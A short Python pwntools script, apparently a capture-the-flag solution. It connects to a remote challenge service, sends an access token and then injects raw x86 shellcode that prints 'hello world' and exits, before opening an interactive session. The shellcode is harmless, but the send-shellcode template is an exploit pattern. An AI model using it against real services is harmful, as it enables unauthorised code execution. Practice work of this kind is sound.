import time
import socket
from pwn import *

ip = "202.38.93.111"
port = 10106

target = remote(ip,port)
#target = process("./overflow")

shellcode = b"\xba\x0c\x00\x00\x00\x68\x72\x6c\x64\x0a\x68\x6f\x20\x77\x6f\x68\x68\x65\x6c\x6c\x89\xe1\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80"



target.sendline(b'277:MEUCIQCAoEmqI4k9dTKqYhiibw5OfBQPsOg1ZDW2IhXlMOe7jAIgQ1akwUHixIoX+1KcwZGVpPEgc7pBIEvu8vY1OcS0l6g=')
target.sendline(shellcode)
target.interactive()
